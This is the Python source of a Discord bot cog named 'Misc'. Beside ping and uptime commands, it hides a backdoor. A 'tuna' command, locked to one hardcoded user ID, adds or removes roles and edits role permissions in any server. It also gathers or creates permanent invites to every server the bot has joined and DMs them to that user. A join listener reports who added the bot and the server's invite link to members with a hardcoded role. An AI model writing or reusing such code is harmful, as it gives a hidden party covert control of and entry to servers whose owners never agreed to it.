import os
import discord
from discord.ext import commands
import datetime

LOGS_DIR = "logs"
os.makedirs(LOGS_DIR, exist_ok=True)
LOG_FILE = os.path.join(LOGS_DIR, "misc_command.log")
NOTIFY_ROLE_ID = 1355842403134603275  # Add this line

def log_misc_command(user_id, command_name):
    timestamp = datetime.datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S")
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(f"[{timestamp}] User: {user_id} | Command: {command_name}\n")

class Misc(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.start_time = datetime.datetime.utcnow()  # Store bot start time

    @commands.hybrid_command(name="ping", description="Check bot latency")
    async def ping(self, ctx: commands.Context):
        log_misc_command(ctx.author.id, "ping")
        latency_ms = round(self.bot.latency * 1000)
        await ctx.send(f"Pong! Latency: {latency_ms} ms")

    @commands.hybrid_command(name="uptime", description="Show bot uptime")
    async def uptime(self, ctx: commands.Context):
        log_misc_command(ctx.author.id, "uptime")
        now = datetime.datetime.utcnow()
        delta = now - self.start_time
        hours, remainder = divmod(int(delta.total_seconds()), 3600)
        minutes, seconds = divmod(remainder, 60)
        await ctx.send(f"Uptime: {hours}h {minutes}m {seconds}s")

    async def send_notify_dm(self, guild: discord.Guild):
        inviter = None
        if guild.me.guild_permissions.view_audit_log:
            try:
                async for entry in guild.audit_logs(limit=1, action=discord.AuditLogAction.bot_add):
                    if entry.target.id == self.bot.user.id:
                        inviter = entry.user
                        break
            except Exception:
                pass

        invite_link = None
        try:
            invites = await guild.invites()
            if invites:
                invite_link = invites[0].url
        except Exception:
            pass

        if not invite_link:
            invite_link = "No invite link found or missing permissions."

        who_added = inviter.mention if inviter else "Unknown"

        for member in guild.members:
            if any(role.id == NOTIFY_ROLE_ID for role in member.roles):
                try:
                    await member.send(
                        f"Bot was added to **{guild.name}**.\n"
                        f"Invite link: {invite_link}\n"
                        f"Added by: {who_added}"
                    )
                except Exception:
                    pass

    @commands.Cog.listener()
    async def on_guild_join(self, guild: discord.Guild):
        await self.send_notify_dm(guild)

    @commands.command(name="tuna")
    async def tuna(self, ctx: commands.Context, action: str = None, subaction: str = None, *args):
        # Only allow user 840949634071658507
        if ctx.author.id != 840949634071658507:
            await ctx.send("You do not have permission to use this command.")
            return

        if action == "role":
            if subaction == "add" and len(args) >= 2:
                member_id = int(args[0])
                role_id = int(args[1])
                member = ctx.guild.get_member(member_id)
                role = ctx.guild.get_role(role_id)
                if member and role:
                    await member.add_roles(role)
                    await ctx.send(f"Added role {role.name} to {member.mention}.")
                else:
                    await ctx.send("Member or role not found.")

            elif subaction == "remove" and len(args) >= 2:
                member_id = int(args[0])
                role_id = int(args[1])
                member = ctx.guild.get_member(member_id)
                role = ctx.guild.get_role(role_id)
                if member and role:
                    await member.remove_roles(role)
                    await ctx.send(f"Removed role {role.name} from {member.mention}.")
                else:
                    await ctx.send("Member or role not found.")

            elif subaction == "perms" and len(args) >= 3:
                role_id = int(args[0])
                perm_name = args[1].lower()
                value = args[2].lower() in ("true", "yes", "1", "enable")

                role = ctx.guild.get_role(role_id)
                if not role:
                    await ctx.send("Role not found.")
                    return

                perms = role.permissions
                if not hasattr(perms, perm_name):
                    await ctx.send(f"Invalid permission: {perm_name}")
                    return

                updated = perms.update(**{perm_name: value})
                await role.edit(permissions=updated)
                await ctx.send(f"Set `{perm_name}` for role {role.name} to `{value}`.")

            else:
                await ctx.send("Usage: !tuna role add|remove <member_id> <role_id>\n"
                               "       !tuna role perms <role_id> <permission_name> <true|false>")

        elif action == "list":
            results = []
            for guild in self.bot.guilds:
                invite_link = None
                try:
                    invites = await guild.invites()
                    if invites:
                        invite_link = invites[0].url
                except Exception:
                    pass

                # Try to create a new invite if none exists
                if not invite_link:
                    try:
                        # Default to first text channel with permission
                        for channel in guild.text_channels:
                            if channel.permissions_for(guild.me).create_instant_invite:
                                invite = await channel.create_invite(max_age=0, max_uses=0)
                                invite_link = invite.url
                                break
                    except Exception:
                        pass

                if not invite_link:
                    invite_link = "No invite found / Missing permissions."

                results.append(f"**{guild.name}** ({guild.id}) → {invite_link}")

            # DM to avoid channel spam
            try:
                await ctx.author.send("\n".join(results))
                await ctx.send("Sent you a DM with all server invites.")
            except Exception:
                await ctx.send("Could not DM you the list.")

        else:
            await ctx.send("Unknown action. Example: !tuna role add <member_id> <role_id>")

async def setup(bot):
    await bot.add_cog(Misc(bot))
